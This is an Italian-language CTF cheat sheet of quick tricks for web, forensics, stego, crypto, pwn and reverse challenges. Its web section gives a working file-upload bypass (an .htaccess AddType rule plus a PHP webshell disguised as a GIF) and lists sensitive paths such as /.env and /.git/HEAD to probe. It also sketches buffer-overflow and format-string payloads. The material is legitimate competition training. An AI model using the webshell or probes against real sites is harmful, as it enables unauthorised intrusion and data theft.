# Quick Wins - Flag Nascoste e Trick Stupidi che Funzionano

A volte la flag è nascosta in modi banali. Prova SEMPRE questi prima di complicarti la vita.

---

## 🔍 PRIMA DI TUTTO - Checklist Veloce (30 secondi)

```bash
# Su QUALSIASI file
strings FILE | grep -iE "(flag|ctf|smd|key|secret)"
file FILE
xxd FILE | head
xxd FILE | tail
exiftool FILE 2>/dev/null

# Su web
curl -s URL | grep -iE "(flag|<!--|comment)"
curl -s URL/robots.txt
curl -s URL/flag.txt
curl -s URL/.git/HEAD
```

---

## 🌐 Web Quick Wins

### Posti dove cercare sempre
```
/robots.txt
/sitemap.xml
/flag.txt
/flag
/.git/HEAD
/.env
/.htaccess
/backup.zip
/backup.sql
/.DS_Store
/admin
/debug
/console  (Flask/Werkzeug)
/.well-known/security.txt
```

### Commenti HTML
```bash
curl -s URL | grep -oP '<!--.*?-->'
# Flag spesso nei commenti: <!-- flag{...} --> o <!-- TODO: remove password -->
```

### File Upload Bypass - .htaccess Trick
Se upload accetta `.htaccess`:
```bash
# 1. Carica .htaccess
echo 'AddType application/x-httpd-php .gif' > .htaccess

# 2. Carica webshell con magic bytes GIF
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# 3. Esegui comandi (usa base64, cat può fallire silenziosamente)
curl "URL/images/shell.gif?cmd=base64%20/var/www/flag.txt" | tail -1 | base64 -d
```

### Source JS
```bash
# View source di tutti i JS caricati
curl -s URL | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//'
# Poi: curl -s URL/path/to/script.js | grep flag
```

### Headers HTTP
```bash
curl -I URL
# Cerca: X-Flag, X-Secret, Flag, o valori strani in header custom
```

### Cookies
```bash
curl -c - URL
# Decode base64 cookies, spesso contengono info o flag dirette
```

---

## 📁 File Quick Wins

### Embedded in file
```bash
# Fine del file (dopo EOF marker)
tail -c 500 file | strings

# Binwalk per file nascosti
binwalk file

# Estrai tutto
binwalk -e file
```

### EXIF/Metadata
```bash
exiftool file
# Campi comuni: Comment, Artist, Author, Title, Description, Copyright
# A volte flag in GPS coordinates che decodificano a testo
```

### File corrotti/troncati
```bash
# Aggiungi header mancante
# PNG: 89 50 4E 47 0D 0A 1A 0A
# JPEG: FF D8 FF
# PDF: 25 50 44 46
# ZIP: 50 4B 03 04

# Correggi con hex editor o:
printf '\x89PNG\r\n\x1a\n' | cat - broken.png > fixed.png
```

---

## 🖼️ Image Quick Wins

### Steganografia ovvia
```bash
# LSB
zsteg image.png  # PNG/BMP

# Steghide (JPEG) - prova password vuota
steghide extract -sf image.jpg -p ""

# Password comuni da provare con steghide
steghide extract -sf image.jpg -p "password"
steghide extract -sf image.jpg -p "123456"
steghide extract -sf image.jpg -p "flag"
```

### Differenza tra immagini
```bash
# Se hai due immagini simili
compare img1.png img2.png diff.png

# O con ImageMagick
convert img1.png img2.png -compose difference -composite diff.png
```

### Testo nascosto (font bianco su bianco)
```bash
# Apri in GIMP → Colors → Invert
# O aumenta contrasto al massimo
```

---

## 🔐 Crypto Quick Wins

### Encoding comuni
```bash
# Base64
echo 'string' | base64 -d

# Base32
echo 'string' | base32 -d

# Hex
echo '68656c6c6f' | xxd -r -p

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.unquote('%66%6c%61%67'))"

# Binary
echo '01100110 01101100' | tr -d ' ' | perl -lpe '$_=pack"B*",$_'
```

### ROT-N
```bash
# ROT13
echo 'synt' | tr 'a-zA-Z' 'n-za-mN-ZA-M'

# Tutti i ROT
for i in {1..25}; do echo "ROT$i: $(echo 'text' | tr "$(printf %${i}s | tr ' ' 'a-zA-Z')a-zA-Z" 'a-zA-Za-zA-Z')"; done
```

### XOR con chiave singola
```python
# Prova XOR con ogni byte
data = bytes.fromhex('encrypted_hex')
for key in range(256):
    result = bytes([b ^ key for b in data])
    if b'flag' in result.lower():
        print(f"Key {key}: {result}")
```

### RSA banale
```python
# Se n è piccolo, fattorizza
# http://factordb.com/

# Se e=3 e m piccolo
# c = m^3, quindi m = c^(1/3)
import gmpy2
m = gmpy2.iroot(c, 3)[0]
print(bytes.fromhex(hex(m)[2:]))
```

---

## 💥 Pwn Quick Wins

### Buffer overflow classico
```python
# Pattern per trovare offset
from pwn import *
# cyclic(200) e cyclic_find(valore_crash)

# ret2win basico
payload = b'A' * offset + p64(win_function_addr)
```

### Format string
```bash
# Leak stack
echo '%p.%p.%p.%p.%p' | ./binary

# Cerca la flag sullo stack
echo '%s.%s.%s.%s' | ./binary  # ATTENZIONE: può crashare
```

### Environment variable
```bash
# A volte la flag è in una env var
strings /proc/$(pidof binary)/environ
env | grep -i flag
```

---

## 🔄 Reverse Quick Wins

### Strings è tuo amico
```bash
strings binary | grep -iE "flag|correct|success|win"
strings binary | grep -E "^.{20,50}$"  # stringhe di lunghezza tipica flag
```

### ltrace/strace
```bash
ltrace ./binary
# Mostra strcmp, spesso con la password/flag in chiaro!

strace ./binary 2>&1 | grep -i flag
```

### GDB rapido
```bash
gdb -batch -ex 'set disassembly-flavor intel' -ex 'disas main' ./binary
```

---

## 🎯 Misc Quick Wins

### Archivi nested
```bash
# Unzip ricorsivo
while true; do
    file=$(find . -name "*.zip" -o -name "*.gz" -o -name "*.tar" | head -1)
    [ -z "$file" ] && break
    case "$file" in
        *.zip) unzip "$file" && rm "$file" ;;
        *.gz) gunzip "$file" ;;
        *.tar) tar xf "$file" && rm "$file" ;;
    esac
done
```

### QR code
```bash
zbarimg image.png
# O online: webqr.com
```

### Morse code
```bash
# .--- --- -.-.
# Cerca "." e "-" patterns nel file
# Decoder online: morsecode.world/international/translator.html
```

### Esadecimale visivo
```
# Se vedi numeri tipo: 102 108 97 103
# Sono ASCII decimali!
python3 -c "print(''.join(chr(int(x)) for x in '102 108 97 103'.split()))"
# Output: flag
```

---

## 🚩 Flag Formats da Conoscere

```
SMDCC{...}          # SMD Cyber Challenge 2025 (UFFICIALE!)
flag{...}           # Standard
FLAG{...}           # Maiuscolo
CTF{...}            # Generico CTF
picoCTF{...}        # picoCTF
HTB{...}            # HackTheBox
THM{...}            # TryHackMe
CCIT{...}           # CyberChallenge.IT
CSAW{...}           # CSAW CTF
DUCTF{...}          # DownUnder CTF

# Regex per cercarli tutti
grep -oE '[A-Za-z0-9_]{2,10}\{[^}]+\}'

# SPECIFICO PER SMD:
grep -oE 'SMDCC\{[^}]+\}'
```

---

## ⚡ Ultimo Resort

Se tutto fallisce:
1. **Rileggi la descrizione** - spesso ci sono hint nascosti
2. **Guarda i punti** - challenge da 50pt non richiedono exploit complessi
3. **Cerca il nome della challenge** - potrebbe essere un hint (es. "Base-ics" = base64)
4. **Prova password ovvie**: `password`, `123456`, `admin`, nome_challenge, nome_ctf
5. **Chiedi hint** (se disponibili)
